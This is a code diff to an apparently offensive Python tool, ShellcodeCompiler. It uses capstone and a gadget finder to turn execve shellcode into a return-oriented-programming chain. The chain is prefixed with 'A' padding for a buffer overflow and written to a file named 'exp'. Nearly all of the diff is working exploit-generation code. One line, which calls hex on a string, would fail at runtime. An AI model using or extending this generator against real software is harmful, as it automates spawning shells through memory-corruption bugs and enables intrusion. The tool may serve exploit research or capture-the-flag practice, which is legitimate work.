@@ -1,5 +1,7 @@
 from capstone import Cs, CS_ARCH_X86, CS_MODE_32
 
+from struct import pack, unpack
+
 from ExecveBuilder import *
 from GadgetFinder import *
 
@@ -20,6 +22,7 @@ class ShellcodeCompiler():
         self.execve_builder = ExecveBuilder(['eax', 'ebx', 'ecx', 'edx'])
         self.gadget_finder = GadgetFinder()
         self.gadgets = {}
+        self.stack_size = 0
         self.chain = b''
         pass
 
@@ -103,7 +106,9 @@ class ShellcodeCompiler():
         print('\n===============Shellcode Reservations===============')
         for idx, instruction in enumerate(self.disassembly):
             new_instruction = instruction.mnemonic + ' ' + instruction.op_str
-            if instruction.mnemonic == 'push': continue
+            if instruction.mnemonic == 'push':
+                self.stack_size += 4
+                continue
             if instruction.mnemonic == 'mov':
                 if instruction.op_str.split(',')[1].strip() == 'esp': continue
                 if instruction.op_str.split(',')[1].strip()[0:2] == '0x':
@@ -125,7 +130,26 @@ class ShellcodeCompiler():
         self.disassemble_shellcode()
         self.analyse_disassembly()
 
-    def start(self, stdout):
+
+    def pad_pop_reg(self, reg, data, used_regs = {}):
+        gadget = self.gadgets['pop ' + reg]
+        p = gadget.compile()
+        print('pop ' + reg)
+        for r in gadget.side_pops:
+            if r == reg: 
+                p += data
+                s = str(hex(unpack('<I', data)[0]))
+                print(s)
+            else: 
+                if r in used_regs.keys(): 
+                    p += pack('<I', used_regs[r])
+                    print( str(hex(used_regs[r])))
+                else: 
+                    p += pack('<I', 0x41414141)
+                    print(hex(str(0x41414141)))
+        return p
+
+    def start(self, stdout, padding):
         self.gadget_finder = GadgetFinder(self.execve_builder.init_gadgets)
         self.SRC = self.execve_builder.SRC
         self.DST = self.execve_builder.DST
@@ -140,5 +164,51 @@ class ShellcodeCompiler():
             print(k + " :: " + str(hex(v.address)) + ", " + str(v.complexity )+ ", " + str(v.side_pops))
         
         print("DATA " + str(hex(self.gadget_finder.data)) + "\n")
-        
 
+        skip = False
+        p = b'A'*padding
+        offset = self.stack_size
+
+        regs = {'eax': 0, 'ebx': 0, 'ecx': 0, 'edx': 0}
+        
+        for idx, instruction in enumerate(self.disassembly):
+            if skip: continue
+            if instruction.mnemonic == 'push':
+                if instruction.op_str[0:2] == '0x':
+                    if self.disassembly[idx + 1].mnemonic == 'pop':
+                        p += self.pad_pop_reg(self.disassembly[idx + 1].op_str, pack('<I', int(instruction.op_str, 16)), regs)
+                        skip = True
+                    else:
+                        p += self.pad_pop_reg(self.DST, pack('<I', self.DATA + offset), regs)
+                        p += self.pad_pop_reg(self.SRC, pack('<I', int(instruction.op_str, 16)), regs)
+                        p += self.gadgets['mov dword ptr [' + self.DST + '], ' + self.SRC].compile()
+                        print('mov dword ptr [' + self.DST + '], ' + self.SRC)
+                        offset -= 4
+                elif instruction.op_str in regs.keys():
+                    p += self.pad_pop_reg(self.DST, pack('<I', self.DATA + offset), regs)
+                    p += self.pad_pop_reg(self.SRC, pack('<I', regs[instruction.op_str]), regs)
+                    p += self.gadgets['mov dword ptr [' + self.DST + '], ' + self.SRC].compile()
+                    print('mov dword ptr [' + self.DST + '], ' + self.SRC)
+                    offset -= 4
+
+            elif len(instruction.op_str.split(',')) == 2:
+                dst = instruction.op_str.split(',')[0].replace('[', '').replace(']', '')
+                src = instruction.op_str.split(',')[1].replace('[', '').replace(']', '').strip()
+                if instruction.mnemonic == 'mov' and src == 'esp': 
+                    p += self.pad_pop_reg(dst, pack('<I', self.DATA + offset), regs)
+                    regs[dst] = self.DATA + offset
+                elif instruction.mnemonic == 'mov' and src[0:2] == '0x':
+                    if dst in ['al']: dst = 'eax'
+                    for _ in range(0, int(src, 16)): 
+                        p += self.gadgets['inc ' + dst].compile() 
+                        print('inc ' + self.DST)
+                else:
+                    p += self.gadgets[instruction.mnemonic + " " + instruction.op_str].compile()
+                    print(instruction.mnemonic + " " + instruction.op_str)
+
+                    if instruction.mnemonic == 'xor' and src == dst: regs[dst] = 0 
+        self.chain = p
+
+    def write_chain(self):
+        out_file = open('exp', 'wb')
+        out_file.write(self.chain)
